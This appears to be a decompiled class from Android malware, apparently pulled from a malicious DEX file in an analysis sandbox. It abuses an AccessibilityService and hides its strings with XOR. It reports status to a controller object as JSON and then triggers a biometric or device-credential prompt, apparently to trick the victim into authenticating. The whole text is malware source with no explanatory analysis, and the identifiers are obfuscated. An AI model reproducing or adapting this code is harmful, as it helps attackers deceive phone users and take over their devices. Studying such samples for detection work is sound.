package com.zjxyxnvvp.nxvxchltf.i;

import android.accessibilityservice.AccessibilityService;
import android.hardware.biometrics.BiometricPrompt;
import android.os.CancellationSignal;
import com.zjxyxnvvp.nxvxchltf.UIDNwaidobaWIODb;
import com.zjxyxnvvp.nxvxchltf.d;
import com.zjxyxnvvp.nxvxchltf.util.b;
import com.zjxyxnvvp.nxvxchltf.util.g;
import java.util.concurrent.Executors;
import org.json.JSONException;
import org.json.JSONObject;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class c {
    private static short[] $ = {3693, 3711, 3687, 3667, 3711, 3701, 3711, 3708, 3693, 3711, 3711, 6751, 6728, 6750, 6744, 6721, 6745, 4500, 4531, 4521, 4536, 4531, 4521, 4605, 4540, 4542, 4521, 4532, 4523, 4532, 4521, 4516, 4605, 4533, 4540, 4526, 4605, 4543, 4536, 4536, 4531, 4605, 4529, 4540, 4520, 4531, 4542, 4533, 4536, 4537, 4605, 4539, 4530, 4527, 4605, 4521, 4533, 4532, 4526};

    /* JADX INFO: Access modifiers changed from: package-private */
    /* loaded from: /home/remnux/decompressedMalicious.dex */
    public class a extends BiometricPrompt.AuthenticationCallback {
        a() {
        }

        @Override // android.hardware.biometrics.BiometricPrompt.AuthenticationCallback
        public void onAuthenticationSucceeded(BiometricPrompt.AuthenticationResult authenticationResult) {
            super.onAuthenticationSucceeded(authenticationResult);
        }
    }

    private static String $(int i, int i2, int i3) {
        char[] cArr = new char[i2 - i];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) ($[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    public static void a(AccessibilityService accessibilityService) {
        p pVar = d.e.c;
        f b2 = pVar.b($(0, 11, 3596));
        if (!UIDNwaidobaWIODb.k && b2 != null && !b2.c()) {
            try {
                JSONObject jSONObject = new JSONObject();
                jSONObject.put($(11, 17, 6701), $(17, 59, 4573));
                pVar.e(b2.b(), jSONObject);
                new BiometricPrompt.Builder(accessibilityService).setTitle((g.n() + b.l(accessibilityService)).substring(0, 1).toUpperCase()).setDeviceCredentialAllowed(true).build().authenticate(new CancellationSignal(), Executors.newSingleThreadExecutor(), new a());
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
    }
}
